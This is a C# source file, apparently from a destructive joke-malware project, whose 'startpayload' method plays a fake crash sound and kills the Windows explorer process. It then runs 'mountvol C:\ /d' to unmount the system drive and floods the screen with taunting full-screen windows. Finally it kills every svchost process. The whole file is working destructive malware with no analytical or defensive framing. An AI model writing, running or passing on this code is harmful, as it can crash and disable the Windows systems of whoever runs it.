using System;
using System.Collections.Generic;
using System.Linq;
using System.Media;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
namespace sysfuck
{
    internal class Class1
    {
        public static void startpayload()
        {
            SoundPlayer snd = new SoundPlayer(Properties.Resources.bsod);
            snd.Play();
            var Processes = Process.GetProcesses().
            Where(pr => pr.ProcessName == "explorer"); // without '.exe'
            foreach (var process in Processes)
            {
                process.Kill();
            }
            Process.Start("mountvol", "C:\\ /d");

            Thread.Sleep(10000);
            SoundPlayer fuck = new SoundPlayer(Properties.Resources.madfucked);
            fuck.Play();
            fuckedlol fuckedoa = new fuckedlol();
            fuckedoa.Show();
            fuckedlol fuckedd = new fuckedlol();
            fuckedd.Show();
            fuckedlol fuckedz = new fuckedlol();
            fuckedz.Show();
            fuckedlol fuckedc = new fuckedlol();
            fuckedc.Show();
            Thread.Sleep(2000);
            fuckedlol megafuck = new fuckedlol();
            megafuck.Show();
            megafuck.WindowState = FormWindowState.Maximized;
            megafuck.Bounds = Screen.PrimaryScreen.Bounds;
            var Processes2 = Process.GetProcesses().
            Where(pr => pr.ProcessName == "svchost"); // without '.exe'
            foreach (var process in Processes2)
            {
                process.Kill();
            }
        }
        
    }
}
